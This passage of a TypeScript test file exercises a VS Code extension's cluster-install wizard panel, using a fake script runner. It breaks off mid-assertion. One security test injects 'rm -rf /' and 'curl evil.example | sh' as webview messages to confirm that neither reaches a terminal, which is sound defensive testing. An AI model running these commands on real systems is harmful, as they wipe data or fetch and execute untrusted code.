// The add-a-cluster page, driven the way an operator drives it (memql#3514).
//
// WHY THIS FILE EXISTS. Nothing tested `AddClusterPanel`. That is not a
// coverage statistic -- it is the specific gap that let four defects reach main
// during epic #3463, each caught by reading code rather than by any test:
//
//   * Retry and Switch-to-Guided were inert. `state.retry()` put the failed
//     step back to `pending` and the panel repainted; nothing re-ran. The
//     operator fixed the cause, pressed Retry, and watched a screen that never
//     changed again.
//   * A failed run called `finish()`, moving to the `done` screen -- "Finished
//     / Nothing further to do" -- taking the operator off the only screen
//     carrying Retry.
//   * A repair could not pass wave 2: with no `providerKeyFile` collected,
//     `present()` dropped the flag and `verify-provider-key.sh` exited 2 on
//     every invocation.
//   * `timeoutMs` was never passed. The field existed in `SessionOptions`;
//     `runner.ts` reads absent as NO timeout, so the omission removed the
//     ceiling rather than choosing one.
//
// The shape is the same every time: each was satisfied by something ADJACENT
// to the requirement -- a type existing, a state transition happening, a button
// rendering -- while the thing the operator needed did not happen. A unit test
// confirms the adjacent fact and passes. `beginRun()` returning `true` says
// nothing about whether the run it started can complete.
//
// WHAT IS REAL HERE, AND WHY IT MATTERS. The state machine is the real
// `AddClusterState`. The graph is the SHIPPED `scripts/install/graph/install.json`
// -- so the wave-2 provider-key gate under test is the one operators run, not a
// fixture that agrees with the test. The plan, the executor, the receipt and
// the params each step is handed are all real. The ONLY fake is script
// EXECUTION: `RunScript`, the seam `installExecutor.test.ts` already uses,
// injected through `AddClusterDeps.runScript`. A fake any further up would be
// the test file talking to itself.
//
// WHAT IS MODELLED BY HAND. The page's own click handler, and nothing else.
// A card is a `<button data-choose=...>` inside the webview's iframe; there is
// a host-to-webview post API but the click direction lives only in the page's
// script, and nothing host-side can dispatch a DOM event into it (established
// in memql#3478, stated in test-host/index.ts). So the EDH lane can prove the
// command opens one panel with the right viewType and cannot press anything --
// which is exactly why this file exists at this layer.

import test from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";

import type { ExtensionContext } from "vscode";

import { ClusterPresence, type AddClusterAction } from "../src/clusters/presence.js";
import { graphDocumentPath, loadGraphFile, type Verify } from "../src/install/graph.js";
import type { ScriptOutcome, ScriptRun } from "../src/install/runner.js";
import { AddClusterPanel, type AddClusterDeps } from "../src/webview/addClusterPanel.js";
import {
  Uri,
  recorded,
  resetRecorded,
  setNextOpenDialogResult,
  type StubWebviewPanel,
} from "./support/vscodeStub.js";

// dist-test/test -> dist-test -> editors/vscode -> editors -> the repository.
// The same walk installGraph.test.ts makes, and for the same reason: the graph
// documents and the capability scripts live at the root, outside this package.
const REPO_ROOT = path.resolve(__dirname, "..", "..", "..", "..");

// A home of our own. The panel writes a receipt and a clusters.yaml on a
// successful run, and a test has no business touching the developer's real
// ~/.memql.
const HOME = fs.mkdtempSync(path.join(os.tmpdir(), "memql-addcluster-panel-"));

// A REAL FILE, because the panel now checks that the key path resolves to one
// before it starts a run (memql#3544). "/tmp/key" was fine while nothing
// looked; a fixture that names a file which does not exist is no longer a
// fixture for the happy path.
const KEY_FILE = path.join(HOME, "provider-key");
fs.writeFileSync(KEY_FILE, "sk-ant-not-a-real-key\n", { mode: 0o600 });

// -----------------------------------------------------------------------------
// the fake runner
// -----------------------------------------------------------------------------

/**
 * The envelope a step's OWN verify predicate asks for, derived from the shipped
 * graph rather than restated.
 *
 * Deriving it is the point. A hand-written envelope per capability would be a
 * second opinion about what each step proves, and it would keep passing after
 * the graph changed what it checks -- which is precisely the failure mode this
 * file exists to catch one layer up.
 */
function satisfying(verify: Verify): Record<string, unknown> {
  const field = (verify.field ?? "").replace(/^result\./, "");
  switch (verify.kind) {
    case "scriptOk":
      return {};
    case "resultTrue":
      return { [field]: true };
    case "resultFalse":
      return { [field]: false };
    case "resultNonEmpty":
      return { [field]: `a-${field}` };
    case "resultEquals":
      return { [field]: verify.value ?? "" };
    default:
      return {};
  }
}

interface FakeRunner {
  run: (run: ScriptRun) => Promise<ScriptOutcome>;
  /** Every invocation, in order, exactly as the executor made it. */
  calls: ScriptRun[];
  /** Capability ids this runner reports as failing, and with what exit code. */
  failing: Map<string, number>;
}

/**
 * A script runner that does what each step's verify asks -- unless told not to.
 *
 * `failing` is keyed by CAPABILITY, and the failure it produces is the shape
 * `executor.ts` actually turns into a failed outcome: a well-formed envelope
 * whose result does not satisfy the verify. That is the normal failure shape
 * for this installer (every step verifies a `result.*` field), so a case that
 * fails a step is exercising the path a real failure takes.
 */
async function fakeRunner(
  failing: Record<string, number> = {},
  /**
   * Extra result fields per capability, merged over what the verify asks for.
   *
   * `satisfying()` derives only the ONE field a step's verify names, which is
   * right for proving a step passed and not enough for a step whose result the
   * wizard then READS. `enrolmentLink` verifies `result.enrolmentState` and
   * carries the link on `result.enrolUrl`, so without this the happy path
   * produces a step that passed and no link -- and a test asserting the link
   * reaches the screen would be asserting against a fixture that cannot
   * produce one.
   */
  extraResults: Record<string, Record<string, unknown>> = {},
): Promise<FakeRunner> {
  const graph = await loadGraphFile(graphDocumentPath("install", REPO_ROOT));
  const verifyFor = new Map<string, Verify>();
  for (const step of graph.steps) verifyFor.set(step.script, step.verify);

  const fake: FakeRunner = {
    calls: [],
    failing: new Map(Object.entries(failing)),
    run: async (run: ScriptRun): Promise<ScriptOutcome> => {
      fake.calls.push(run);
      const capability = run.capability ?? "";
      const verify = verifyFor.get(capability);
      assert.ok(verify !== undefined, `the fake runner was asked for unknown capability ${capability}`);
      const exitCode = fake.failing.get(capability);
      const ok = exitCode === undefined;
      return {
        argv: [run.scriptPath],
        exitCode: ok ? 0 : exitCode,
        signal: null,
        stdout: "",
        stderr: "",
        envelope: {
          ok,
          capability,
          changed: ok,
          // A failed step's result does NOT satisfy its verify -- which is what
          // makes it failed. `{}` has no field at all, so evaluateVerify
          // returns false for every kind.
          result: ok ? { ...satisfying(verify), ...(extraResults[capability] ?? {}) } : {},
          error: ok ? null : { code: exitCode, message: `the fake refused ${capability}` },
        },
      };
    },
  };
  return fake;
}

// -----------------------------------------------------------------------------
// the harness
// -----------------------------------------------------------------------------

interface Harness {
  /** What the panel last rendered. */
  html(): string;
  /** Posts what a click in the page would post. */
  post(message: unknown): void;
  panel: StubWebviewPanel;
  receiptFile: string;
  clustersPath: string;
  close(): void;
}

function context(): ExtensionContext {
  return { subscriptions: [] } as unknown as ExtensionContext;
}

/**
 * A presence probe that answers without touching the network or the operator's
 * files: the real `ClusterPresence`, over injected readers.
 */
function presenceFor(
  verdict: "absent" | "installed-healthy" | "installed-unreachable",
): ClusterPresence {
  return new ClusterPresence({
    clustersPath: path.join(HOME, "clusters.yaml"),
    receiptPath: path.join(HOME, "no-such-receipt.json"),
    // The entry carries a non-empty `receipt` because that is what
    // `receiptEvidence` counts (memql#3544): an ARTIFACT, not an entry, so a
    // failed run that recorded only its read-only steps is not read as an
    // installed cluster. An empty entry list produced `absent` whatever this
    // parameter said, which made the label here aspirational.
    readReceiptFile: async () =>
      verdict === "absent"
        ? null
        : {
            version: 1,
            graph: "install",
            startedAt: "",
            updatedAt: "",
            entries: [
              {
                stepId: "toolK3d",
                script: "install/tool.sh",
                receipt: "binary",
                preExisting: false,
                params: {},
                result: {},
                changed: true,
                recordedAt: "",
              },
            ],
          },
    readClusters: async () => ({ ok: true as const, file: { selectedCluster: "", clusters: [] } }),
    // Evidence WITHOUT an answer is `installed-unreachable`; evidence WITH one
    // is `installed-healthy`. Both are "something is here", which is what the
    // repair, uninstall and reconnect cards hang off.
    probe: async () => verdict === "installed-healthy",
  });
}

function open(options: {
  action?: AddClusterAction;
  runner?: FakeRunner;
  verdict?: "absent" | "installed-healthy" | "installed-unreachable";
  /** Seeded before the panel opens, for the repair cases. */
  receipt?: unknown;
}): Harness {
  resetRecorded();
  const dir = fs.mkdtempSync(path.join(HOME, "case-"));
  const receiptFile = path.join(dir, "install-receipt.json");
  const clustersPath = path.join(dir, "clusters.yaml");
  if (options.receipt !== undefined) {
    fs.writeFileSync(receiptFile, JSON.stringify(options.receipt));
  }

  const deps: AddClusterDeps = {
    clustersPath,
    receiptFile,
    installRoot: REPO_ROOT,
    // Every run now writes a record (memql#3739), and it defaults to
    // ~/.memql/runs -- so without this the unit lane deposits a file in the
    // developer's own run log, and in CI's, once per case that starts a run.
    runsDir: path.join(dir, "runs"),
    refreshTree: () => undefined,
    removeRegistryEntry: async () => undefined,
    ...(options.runner ? { runScript: options.runner.run } : {}),
  };

  AddClusterPanel.show(
    context(),
    presenceFor(options.verdict ?? "absent"),
    deps,
    options.action,
  );
  const panel = recorded.webviews[recorded.webviews.length - 1]!;

  return {
    panel,
    receiptFile,
    clustersPath,
    html: () => panel.html,
    post: (message: unknown) => panel.send(message),
    close: () => panel.close(),
  };
}

/** Fills the collect form the way typing into it does, then starts the run. */
function beginInstall(h: Harness): void {
  h.post({ type: "choose", value: "install" });
  h.post({ type: "input", value: { field: "domain", text: "memql.localhost" } });
  h.post({ type: "input", value: { field: "ownerFirstName", text: "Ada" } });
  h.post({ type: "input", value: { field: "ownerLastName", text: "Lovelace" } });
  h.post({ type: "input", value: { field: "ownerEmail", text: "ada@example.com" } });
  h.post({ type: "input", value: { field: "provider", text: "anthropic" } });
  h.post({ type: "input", value: { field: "providerKeyFile", text: KEY_FILE } });
  h.post({ type: "begin" });
}

/**
 * Waits for a condition the run reaches asynchronously.
 *
 * The panel's message handler is synchronous and starts the run with `void`, so
 * there is no promise to await. A bounded poll is what a caller has, and the
 * bound is what turns "this hangs" into a named failure.
 */
async function until(condition: () => boolean, what: string): Promise<void> {
  for (let i = 0; i < 2_000; i += 1) {
    if (condition()) return;
    await new Promise((resolve) => setTimeout(resolve, 1));
  }
  throw new Error(`timed out waiting for ${what}`);
}

// -----------------------------------------------------------------------------
// Defect 1: a repair with no recorded key must be REFUSED, not started
// -----------------------------------------------------------------------------

test("a repair with no recorded provider key is refused before anything runs", async () => {
  const runner = await fakeRunner();
  const h = open({ action: "repair", runner, verdict: "installed-unreachable" });
  try {
    // A repair now COLLECTS the key path (memql#3544) and the panel pre-fills
    // it from the receipt. There is no receipt here, so the box stays empty and
    // the refusal is the form's own -- which is the improvement: it names the
    // field, and it happens before any step runs.
    h.post({ type: "begin" });
    await until(() => /provider key file is required/i.test(h.html()), "the refusal");

    // THE ASSERTION THAT MATTERS. Not that a message was rendered -- that the
    // graph was never entered. Reaching wave 2 with no `--key-file` is the
    // defect, and it is invisible to any assertion about state.
    assert.equal(runner.calls.length, 0, "a repair with no key must not run a single step");
  } finally {
    h.close();
  }
});

test("a repair reads the key path back off the receipt and does reach wave 2", async () => {
  const runner = await fakeRunner();
  const h = open({
    action: "repair",
    runner,
    verdict: "installed-unreachable",
    // What the install's own `providerKey` step recorded. It leaves no
    // artifact, but the executor records every step that returns an envelope,
    // which is why the path is on disk to be read back (memql#3512).
    receipt: {
      version: 1,
      graph: "install",
      startedAt: "2026-08-01T00:00:00Z",
      updatedAt: "2026-08-01T00:00:00Z",
      entries: [
        {
          stepId: "providerKey",
          script: "install.verifyProviderKey",
          receipt: "",
          preExisting: false,
          // A path that EXISTS, because the panel now refuses to start a run
          // on one that does not (memql#3544). The value under test is still
          // "whatever the receipt recorded", which is what this case is about.
          params: { provider: "openai", "key-file": KEY_FILE },
          result: { valid: true },
          changed: false,
          recordedAt: "2026-08-01T00:00:00Z",
        },
        {
          // The bootstrap answers, which a real install records and a repair
          // has to recover (znasllc-io#3888). Without them the repair now stops
          // on the form asking for the owner -- correctly, since reaching
          // `seedBootstrap` without them is an `exit 2` nine minutes in -- and
          // this case would stop testing what it is about.
          stepId: "seedBootstrap",
          script: "install.seedBootstrap",
          receipt: "",
          preExisting: false,
          params: {
            domain: "memql.localhost",
            "owner-email": "owner@example.com",
            "owner-first-name": "Ada",
            "owner-last-name": "Lovelace",
            "registration-mode": "invite_only",
          },
          result: {},
          changed: true,
          recordedAt: "2026-08-01T00:00:00Z",
        },
      ],
    },
  });
  try {
    // The repair form is PRE-FILLED from the receipt (memql#3544) rather than
    // reading it behind the operator's back, so the recorded answers are on
    // screen and can be corrected. Waiting for that is waiting for the read.
    await until(() => h.html().includes(KEY_FILE), "the recorded key path to reach the form");
    assert.match(h.html(), /value="openai" selected/, "and the recorded vendor with it");

    h.post({ type: "begin" });
    await until(
      () => runner.calls.some((c) => c.capability === "install.verifyProviderKey"),
      "the provider-key step to run",
    );

    const key = runner.calls.find((c) => c.capability === "install.verifyProviderKey")!;
    assert.equal(
      key.params["key-file"],
      KEY_FILE,
      "the recorded key path must reach the step -- an absent flag is exit 2",
    );
    assert.equal(
      key.params.provider,
      "openai",
      "and the recorded VENDOR with it: re-asserting the wizard's default would " +
        "check an OpenAI key against Anthropic and report the key as refused",
    );
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// Defect 2: Retry must RE-INVOKE, not repaint
// -----------------------------------------------------------------------------

test("Retry runs the graph again rather than repainting a pending step", async () => {
  const runner = await fakeRunner({ "install.verifyProviderKey": 3 });
  const h = open({ runner });
  try {
    beginInstall(h);
    await until(() => /data-act="retry"/.test(h.html()), "the failed-step screen");
    const before = runner.calls.length;

    // The operator fixes what was wrong -- in another window, which is exactly
    // why Retry is offered on every failure -- and presses Retry.
    runner.failing.clear();
    h.post({ type: "retry" });
    await until(() => runner.calls.length > before, "a second invocation");

    assert.ok(
      runner.calls.length > before,
      "Retry must execute something; `state.retry()` plus a repaint executes nothing",
    );
    await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");
  } finally {
    h.close();
  }
});

test("Switch-to-guided re-invokes for the same reason Retry does", async () => {
  const runner = await fakeRunner({ "install.verifyProviderKey": 5 });
  const h = open({ runner });
  try {
    beginInstall(h);
    await until(() => /data-act="guided"/.test(h.html()), "the failed-step screen");
    const before = runner.calls.length;

    runner.failing.clear();
    h.post({ type: "guided" });
    await until(() => runner.calls.length > before, "a second invocation");
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// Defect 3: a failed run must STAY on the screen carrying the recoveries
// -----------------------------------------------------------------------------

test("a settled run with a failed step still offers Retry, and does not claim it finished", async () => {
  const runner = await fakeRunner({ "install.verifyProviderKey": 3 });
  const h = open({ runner });
  try {
    beginInstall(h);
    // Settled: the executor has blocked the dependent subtree and returned. The
    // defect was calling `finish()` here, which moves to `done`.
    await until(() => /failed/.test(h.html()), "a failure to be reported");
    await until(
      () => !runner.calls.some(() => false) && /data-act="retry"/.test(h.html()),
      "the failed-step screen",
    );
    // Let anything still in flight settle, then assert what is on screen.
    await new Promise((resolve) => setTimeout(resolve, 20));

    const html = h.html();
    assert.match(html, /data-act="retry"/, "the failed run must keep Retry reachable");
    assert.match(html, /data-act="guided"/, "and Switch-this-step-to-guided with it");
    assert.doesNotMatch(
      html,
      /Nothing further to do/,
      'a failed install must never render the "Finished" screen',
    );
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// Defect 4: every step must be handed a timeout
// -----------------------------------------------------------------------------

test("every step is invoked with a non-zero timeout", async () => {
  const runner = await fakeRunner();
  const h = open({ runner });
  try {
    beginInstall(h);
    await until(() => runner.calls.length > 0, "the first step");
    await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");

    assert.ok(runner.calls.length > 1, "the whole graph should have run");
    for (const call of runner.calls) {
      // `runner.ts`: "0 or absent means no timeout". Absent is not a default,
      // it is the REMOVAL of the ceiling -- which is how this went missing the
      // first time, with the field present in SessionOptions and never passed.
      assert.ok(
        typeof call.timeoutMs === "number" && call.timeoutMs > 0,
        `step ${call.capability} was given no timeout ceiling`,
      );
    }
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// The provider is COLLECTED, and what is collected is what runs (memql#3473)
// -----------------------------------------------------------------------------

test("the collect screen offers a provider, as a choice rather than a box", async () => {
  const h = open({});
  try {
    h.post({ type: "choose", value: "install" });
    const html = h.html();
    assert.match(html, /<select[^>]*data-field="provider"/, "a free-text box could hold anything");
    assert.match(html, /value="anthropic" selected/, "and one answer is already given");
    assert.match(html, /value="openai"/, "the other vendor the script supports is reachable");
  } finally {
    h.close();
  }
});

test("the provider the operator chose is the provider the step verifies", async () => {
  // The whole of the defect: `provider` was hardcoded in this panel AND pinned
  // in install.json, where GRAPH PARAMS WIN -- so even a caller-supplied value
  // could not have overridden it. An operator with an OpenAI key had no route
  // through the wizard at all.
  const runner = await fakeRunner();
  const h = open({ runner });
  try {
    h.post({ type: "choose", value: "install" });
    h.post({ type: "input", value: { field: "domain", text: "memql.localhost" } });
    h.post({ type: "input", value: { field: "ownerFirstName", text: "Ada" } });
    h.post({ type: "input", value: { field: "ownerLastName", text: "Lovelace" } });
    h.post({ type: "input", value: { field: "ownerEmail", text: "ada@example.com" } });
    h.post({ type: "input", value: { field: "provider", text: "openai" } });
    h.post({ type: "input", value: { field: "providerKeyFile", text: KEY_FILE } });
    h.post({ type: "begin" });

    await until(
      () => runner.calls.some((c) => c.capability === "install.verifyProviderKey"),
      "the provider-key step",
    );
    const key = runner.calls.find((c) => c.capability === "install.verifyProviderKey")!;
    assert.equal(key.params.provider, "openai");

    // And it reaches the step that seeds the cluster, not only the one that
    // checks the key -- a cluster seeded for the wrong vendor is a working
    // install that cannot answer.
    await until(
      () => runner.calls.some((c) => c.capability === "install.seedBootstrap"),
      "the bootstrap step",
    );
    const seed = runner.calls.find((c) => c.capability === "install.seedBootstrap")!;
    assert.equal(seed.params.provider, "openai");
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// Typing must not repaint the page under the cursor (memql#3538)
// -----------------------------------------------------------------------------

test("typing a character does not replace the document the operator is typing into", () => {
  // THE DEFECT, stated as the operator meets it: type one character into any
  // box on this screen and the caret is gone, because the keystroke posted an
  // `input` message and the handler answered it with a full `render()`.
  // Assigning `webview.html` reloads the whole document -- there is no
  // surviving focused element on the other side of it -- so the form could only
  // be filled one click-and-character at a time.
  //
  // The count is asserted rather than the focus because focus is a property of
  // a DOM this lane does not have. It is the same fact: a document that was
  // never replaced still has whatever the operator was doing in it.
  const h = open({});
  try {
    h.post({ type: "choose", value: "install" });
    const painted = h.panel.renders;

    h.post({ type: "input", value: { field: "ownerFirstName", text: "A" } });
    h.post({ type: "input", value: { field: "ownerFirstName", text: "Ad" } });
    h.post({ type: "input", value: { field: "ownerFirstName", text: "Ada" } });

    assert.equal(
      h.panel.renders,
      painted,
      "three keystrokes repainted the page, so the operator lost focus three times",
    );
  } finally {
    h.close();
  }
});

test("what was typed without a repaint is still there when one comes", async () => {
  // The other half, and the reason the keystroke message is KEPT rather than
  // removed with the render it triggered. The extension is where form state
  // lives -- the DOM is discarded on every repaint -- so a screen that stopped
  // recording keystrokes would hand the next render an empty form. Recording
  // without repainting is the whole fix.
  const h = open({});
  try {
    h.post({ type: "choose", value: "install" });
    h.post({ type: "input", value: { field: "ownerFirstName", text: "Ada" } });
    h.post({ type: "input", value: { field: "provider", text: "openai" } });

    // An action repaints -- here the incomplete form's refusal to start.
    // `begin` is async now (it stats the key path before starting anything),
    // so the repaint it causes is one tick away.
    h.post({ type: "begin" });
    await until(() => /is required/.test(h.html()), "the refusal to repaint");

    const html = h.html();
    assert.match(html, /value="Ada"/, "the name typed before the repaint survived it");
    assert.match(html, /value="openai" selected/, "and so did the vendor chosen");
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// The steps AHEAD, and every failure rather than one of them (memql#3474)
// -----------------------------------------------------------------------------

test("the steps ahead are on screen while the first one is still running", () => {
  // `pending` was unreachable in a forward run: a step first appeared when it
  // STARTED. All six states rendered correctly and all six were unit-tested by
  // feeding them in directly, and none of that put one on screen ahead of its
  // turn -- so an operator ten minutes into an install could not see how much
  // was left.
  //
  // The gate is what makes this observable: the first step does not return
  // until the assertion has been made, so the run is genuinely mid-flight.
  return (async () => {
    const runner = await fakeRunner();
    let release = (): void => undefined;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const inner = runner.run;
    let entered = 0;
    let gated = true;
    runner.run = async (run) => {
      entered += 1;
      if (gated) {
        gated = false;
        await gate;
      }
      return inner(run);
    };

    const h = open({ runner });
    try {
      beginInstall(h);
      // `calls` is recorded by the inner runner, which the gate is holding --
      // so the wrapper's own counter is what says the step is in flight.
      await until(() => entered > 0, "the first step to be in flight");
      // Drain the render that followed `stepStarted`.
      await new Promise((resolve) => setTimeout(resolve, 5));

      const html = h.html();
      assert.match(html, /detect/, "the running step is on screen");
      assert.match(
        html,
        /enrolmentLink|enrolment/i,
        "so is the LAST step of the graph, which has not started and may never",
      );

      release();
      await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");
    } finally {
      release();
      h.close();
    }
  })();
});

test("a wave with several failures explains each of them, not one at random", async () => {
  // The executor runs a wave under Promise.all and deliberately lets
  // independent branches finish, so the operator sees every failure this run
  // has. The failure SCREEN then showed guidance for whichever one resolved
  // last -- a scheduling accident -- though the codes ask for different things:
  // exit 4 says go and install something, exit 3 says the step protected
  // something and will refuse again.
  const runner = await fakeRunner({ "install.binary": 4, "install.hostsEntries": 3 });
  const h = open({ runner });
  try {
    beginInstall(h);
    await until(() => /data-act="retry"/.test(h.html()), "the failed-step screen");
    await new Promise((resolve) => setTimeout(resolve, 20));

    const html = h.html();
    assert.match(html, /steps failed/, "the heading counts them rather than naming one");
    assert.match(
      html,
      /Something this step needs is not on this machine/,
      "exit 4's guidance, for the tool steps",
    );
    assert.match(html, /The step refused to act/, "exit 3's guidance, for the hosts block");
    assert.match(
      html,
      /Retry these steps/,
      'the label must not say "this step" in front of four failures',
    );
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// The hand-off gate, which the same shape of defect would hide
// -----------------------------------------------------------------------------

test("a completed install registers the cluster and offers sign-in", async () => {
  const runner = await fakeRunner();
  const h = open({ runner });
  try {
    beginInstall(h);
    await until(() => /Your cluster is ready/.test(h.html()), "the hand-off screen");

    assert.match(h.html(), /data-act="signInAsOwner"/);
    assert.ok(fs.existsSync(h.clustersPath), "the cluster must land in the registry");
    assert.ok(
      recorded.executed.includes("memql.clusters.refresh"),
      "the tree must be told there is a new cluster",
    );
  } finally {
    h.close();
  }
});

test("a cancelled run hands nothing off, and leaves a receipt that describes what ran", async () => {
  const runner = await fakeRunner();
  const h = open({ runner });
  try {
    beginInstall(h);
    await until(() => runner.calls.length > 0, "the first step");
    h.post({ type: "cancel" });
    await until(() => /Cancelled/.test(h.html()), "the cancelled screen");
    // The screen turns over on the KEYSTROKE; the executor stops at the next
    // wave boundary, and the in-flight wave writes its receipt entries on the
    // way out. Waiting for the file is waiting for that -- and it is the
    // property under test, so a timeout here names it.
    await until(() => fs.existsSync(h.receiptFile), "the receipt a cancelled run still leaves");

    assert.doesNotMatch(
      h.html(),
      /Your cluster is ready/,
      "a cancelled run is `ok` -- everything that ran, worked -- and must not be handed off",
    );
    assert.ok(!fs.existsSync(h.clustersPath), "nothing may be registered for a cancelled install");
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// The key file can be PICKED, not only typed (memql#3547)
// -----------------------------------------------------------------------------

test("the key-file field offers a Browse button; the other fields do not", () => {
  // Only the field that names a FILE gets a picker. A Browse button beside the
  // owner's email would be noise, and beside the domain it would be wrong.
  const h = open({});
  try {
    h.post({ type: "choose", value: "install" });
    const html = h.html();
    assert.match(html, /data-act="browseKeyFile"/, "the key path is chosen from disk");
    assert.equal(
      (html.match(/data-act="browseKeyFile"/g) ?? []).length,
      1,
      "exactly one field names a file",
    );
  } finally {
    h.close();
  }
});

test("choosing a file in the dialog fills the field with its path", async () => {
  const h = open({});
  try {
    h.post({ type: "choose", value: "install" });
    setNextOpenDialogResult([Uri.file(KEY_FILE)]);
    h.post({ type: "browseKeyFile" });

    await until(() => h.html().includes(KEY_FILE), "the chosen path to reach the form");

    // THE DIALOG'S SHAPE IS PART OF THE CONTRACT. One file, not many; a file,
    // not a directory -- a `--key-file` flag can be handed exactly one path,
    // and a directory is not a key.
    const options = recorded.openDialogs[0]!;
    assert.equal(options.canSelectMany, false);
    assert.equal(options.canSelectFiles, true);
    assert.equal(options.canSelectFolders, false);
  } finally {
    h.close();
  }
});

test("cancelling the dialog leaves the form exactly as it was", async () => {
  // The case that is easy to get wrong and invisible when it is: an empty
  // result must not be read as "the operator chose nothing, so clear it".
  const h = open({});
  try {
    h.post({ type: "choose", value: "install" });
    h.post({ type: "input", value: { field: "providerKeyFile", text: KEY_FILE } });
    h.post({ type: "input", value: { field: "ownerFirstName", text: "Ada" } });

    setNextOpenDialogResult(undefined);
    h.post({ type: "browseKeyFile" });
    await until(() => recorded.openDialogs.length === 1, "the dialog to be asked for");

    // Force a repaint through an ordinary action, then read what the form holds.
    h.post({ type: "begin" });
    await until(() => /is required/.test(h.html()), "the incomplete form's refusal");
    assert.match(h.html(), new RegExp(`value="${KEY_FILE}"`), "the typed path survived");
    assert.match(h.html(), /value="Ada"/, "and so did everything else");
  } finally {
    h.close();
  }
});

test("a picked file is validated too, so a directory chosen by other means is caught", async () => {
  // The picker is asked for files only, so this is defence rather than the
  // common case -- but the validation lives on the VALUE, not on how it
  // arrived, which is what keeps the typed and picked routes honest against
  // each other.
  const h = open({});
  try {
    h.post({ type: "choose", value: "install" });
    setNextOpenDialogResult([Uri.file(HOME)]);
    h.post({ type: "browseKeyFile" });
    await until(() => /directory/i.test(h.html()), "the refusal");
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// A privileged remedy is handed to the operator, not run for them (memql#3551)
// -----------------------------------------------------------------------------

/** A runner whose named capability fails carrying a remedy in its envelope. */
async function runnerFailingWithRemedy(capability: string, remedy: string): Promise<FakeRunner> {
  const fake = await fakeRunner({ [capability]: 4 });
  const inner = fake.run;
  fake.run = async (run) => {
    const outcome = await inner(run);
    if (run.capability === capability && outcome.envelope) {
      outcome.envelope.result = { remedy };
    }
    return outcome;
  };
  return fake;
}

test("a failure that names a remedy offers to open it in a terminal", async () => {
  // WHY THE HANDOFF EXISTS. The runner spawns every capability UNPRIVILEGED --
  // there is no sudo, pkexec or askpass anywhere in the extension -- and the
  // install graph has steps that need root. Without this the wizard's only
  // honest move is to print a command and stop.
  const remedy = "sudo usermod -aG docker ada";
  const runner = await runnerFailingWithRemedy("install.dockerAccess", remedy);
  const h = open({ runner });
  try {
    beginInstall(h);
    await until(() => /data-remedy=/.test(h.html()), "the remedy control");
    assert.match(h.html(), new RegExp(escapeForRegExp(remedy)), "the command is shown in full");
  } finally {
    h.close();
  }
});

test("the command is TYPED into the terminal, never executed", async () => {
  // THE PROPERTY THAT MATTERS. `sendText(cmd, false)` omits the newline, so a
  // command that runs as root waits for a person to read it and press Enter.
  // VS Code's default for that flag is TRUE -- forgetting it would mean a
  // privileged command running the instant a button was clicked.
  const remedy = "sudo usermod -aG docker ada";
  const runner = await runnerFailingWithRemedy("install.dockerAccess", remedy);
  const h = open({ runner });
  try {
    beginInstall(h);
    await until(() => /data-remedy=/.test(h.html()), "the remedy control");

    h.post({ type: "remedy", value: "dockerAccess" });
    await until(() => recorded.terminals.length === 1, "the terminal");

    const terminal = recorded.terminals[0]!;
    assert.equal(terminal.shown, true, "an unshown terminal helps nobody");
    assert.deepEqual(terminal.sent, [{ text: remedy, executed: false }]);
  } finally {
    h.close();
  }
});

test("the command comes from the panel's state, never from the message", async () => {
  // THE SECURITY PROPERTY. Anything running in the webview can post any message
  // it likes. If the command travelled on the wire, that iframe would choose
  // what the operator is invited to run as root -- which is the same class of
  // hole `shell:false` exists to close in the runner.
  const remedy = "sudo usermod -aG docker ada";
  const runner = await runnerFailingWithRemedy("install.dockerAccess", remedy);
  const h = open({ runner });
  try {
    beginInstall(h);
    await until(() => /data-remedy=/.test(h.html()), "the remedy control");

    // A message naming a step that did not fail, and one carrying a command of
    // its own choosing. Neither may reach a terminal.
    h.post({ type: "remedy", value: "toolK3d" });
    h.post({ type: "remedy", value: "rm -rf /" });
    h.post({ type: "remedy", value: { command: "curl evil.example | sh" } });
    await new Promise((resolve) => setTimeout(resolve, 20));

    assert.equal(recorded.terminals.length, 0, "no command the panel did not record may run");
  } finally {
    h.close();
  }
});

function escapeForRegExp(value: string): string {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

// -----------------------------------------------------------------------------
// the route into ownership the install used to drop (memql#3408, memql#3906)
// -----------------------------------------------------------------------------
//
// The `enrolmentLink` step mints a single-use passkey link inside the cluster.
// `src/install/enrolment.ts` was written to open it -- and was reachable from
// nothing but its own test. An operator finished a successful install with no
// way to reach the credential the install had just created for them; the URL
// survived only in the receipt on disk, which nothing tells them about.
//
// The failure shape is this file's recurring one: every piece existed and was
// individually green, and the operator's path still did not work.
//
// memql#3906 moved what the screen REMEMBERS. It used to hold the run's link
// and replay it, which failed twice over: the link is single-use and expires in
// fifteen minutes, so the button was dead by the time anyone came back to it,
// and a run that minted none offered nothing at all. The screen now remembers
// only that an owner ACCOUNT exists -- a durable fact -- and the button mints a
// fresh link when pressed.

async function runToDoneWithOwner(): Promise<Harness> {
  const runner = await fakeRunner(
    {},
    { "install.enrolmentLink": { ownerClaimed: true, enrolmentState: "minted" } },
  );
  const h = open({ runner });
  beginInstall(h);
  await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");
  return h;
}

test("a successful install offers to enrol against the owner it bootstrapped", async () => {
  const h = await runToDoneWithOwner();
  try {
    const html = h.html();
    assert.match(html, /Your cluster is ready/, "the run should have reached the done screen");
    assert.match(
      html,
      /data-act="enrolPasskey"/,
      "the done screen must offer a route to ownership. Bootstrapping an account " +
        "with no way to sign into it leaves the operator holding nothing at the one " +
        "moment they are ready to use the cluster",
    );
    assert.match(
      html,
      /class="primary" type="button" data-act="enrolPasskey"/,
